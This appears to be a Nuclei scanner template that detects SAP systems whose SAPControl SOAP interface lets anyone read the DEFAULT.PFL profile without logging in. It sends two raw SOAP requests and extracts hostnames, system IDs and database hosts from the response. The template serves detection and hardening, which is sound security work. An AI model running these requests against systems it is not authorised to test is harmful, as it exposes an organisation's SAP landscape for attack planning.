id: sap-sapcontrol-readconfig

info:
  name: SAPControl - Read DEFAULT.PFL Config without authentication
  author: LRVT, l4rm4nd
  severity: medium
  description: |
    Detects SAP systems where the SAP Start Service (sapstartsrv) SAPControl
    SOAP interface exposes the ReadConfigFile web method in combination with
    an unprotected ListConfigFiles call, allowing unauthenticated reading of
    the global DEFAULT.PFL profile.

    DEFAULT.PFL is the central default profile of an SAP system and is read
    by all instances during startup. It typically contains system-wide
    parameters such as SAPSYSTEMNAME, SAPGLOBALHOST, SAPDBHOST, SAPFQDN,
    message server host and port, logon configuration and other critical
    technical settings. If an attacker can retrieve DEFAULT.PFL without
    authentication, they obtain a detailed blueprint of the SAP landscape
    including hostnames, SIDs, database hosts and sometimes security-relevant
    parameters.

    This information disclosure significantly supports reconnaissance and
    attack planning. In misconfigured systems, sensitive values like internal
    FQDNs, gateway definitions or even credentials and keys may be stored in
    the profile, further increasing the impact. Access to ReadConfigFile
    should be restricted via service/protectedwebmethods and the sapstartsrv
    HTTP(S) ports must be limited to trusted administration networks only.
  tags: sap,sapcontrol,soap,config,info-disclosure
  reference:
    - https://help.sap.com/docs/SAP_NETWEAVER_700/1098b2396c531014be229f0b7ff0e0c6/95840a509ece466ce10000000a423f68.html  # DEFAULT.PFL default profile
    - https://learning.sap.com/courses/technical-implementation-and-operation-i-of-sap-s-4hana-and-sap-business-suite/configuring-sap-systems-via-profile-parameters  # profile files & DEFAULT.PFL
    - https://sapbasissolutions.wordpress.com/2013/10/08/what-are-sap-default-start-instance-profiles/  # sample DEFAULT.PFL contents
    - https://help.sap.com/docs/SUPPORT_CONTENT/si/3362958690.html  # sapstartsrv security & protected web methods
    - https://community.sap.com/t5/technology-blog-posts-by-members/securing-the-sap-instance-agent-sap-start-service/ba-p/13486679  # hardening sapstartsrv

http:
  - raw:
      # First request - List config files
      - |
        POST {{Path}} HTTP/1.1
        Host: {{Hostname}}
        Content-Type: text/xml; charset=UTF-8
        SOAPAction: ""
        
        <?xml version="1.0" encoding="utf-8"?>
        <SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/">
          <SOAP-ENV:Header>
            <sapsess:Session xmlns:sapsess="http://www.sap.com/webas/630/soap/features/session/">
              <enableSession>true</enableSession>
            </sapsess:Session>
          </SOAP-ENV:Header>
          <SOAP-ENV:Body>
            <ns1:ListConfigFiles xmlns:ns1="urn:SAPControl"/>
          </SOAP-ENV:Body>
        </SOAP-ENV:Envelope>

      # Second request - Read ONLY the DEFAULT.PFL config file
      - |
        POST {{Path}} HTTP/1.1
        Host: {{Hostname}}
        Content-Type: text/xml; charset=UTF-8
        SOAPAction: ""
        
        <?xml version="1.0" encoding="utf-8"?>
        <SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/">
          <SOAP-ENV:Header>
            <sapsess:Session xmlns:sapsess="http://www.sap.com/webas/630/soap/features/session/">
              <enableSession>true</enableSession>
            </sapsess:Session>
          </SOAP-ENV:Header>
          <SOAP-ENV:Body>
            <ns1:ReadConfigFile xmlns:ns1="urn:SAPControl">
              <filename>{{default_pfl}}</filename>
            </ns1:ReadConfigFile>
          </SOAP-ENV:Body>
        </SOAP-ENV:Envelope>

    req-condition: true

    extractors:

      # From ListConfigFiles: grab the entry that contains DEFAULT.PFL
      # Example: <item>/usr/sap/IFT/SYS/profile/DEFAULT.PFL</item>
      - type: regex
        name: default_pfl
        part: body_1
        internal: true
        group: 1
        regex:
          - '<item>([^<]*DEFAULT\.PFL[^<]*)</item>'

      # From ReadConfigFile(DEFAULT.PFL): extract interesting key = value pairs
      # based on your example response
      - type: regex
        part: body           # second response (ReadConfigFile)
        name: DEFAULT.PFL
        regex:
          - 'SAPSYSTEMNAME\s*=\s*[^\s<]+'         # SAP system name
          - 'SAPGLOBALHOST\s*=\s*[^\s<]+'        # global host
          - 'system/type\s*=\s*[^\s<]+'          # system type (e.g. J2EE)
          - 'SAPFQDN\s*=\s*[^\s<]+'              # FQDN
          - 'SAPDBHOST\s*=\s*[^\s<]+'            # DB host

    matchers-condition: and
    matchers:
      # Ensure ListConfigFiles worked and we got configfiles back
      - type: word
        part: body_1
        words:
          - "ListConfigFilesResponse"
          - "<configfiles>"
        condition: and

      # Ensure ReadConfigFile(DEFAULT.PFL) was successful
      - type: word
        part: body
        words:
          - "ReadConfigFileResponse"
          - "<lines>"
        condition: and

      - type: status
        status:
          - 200
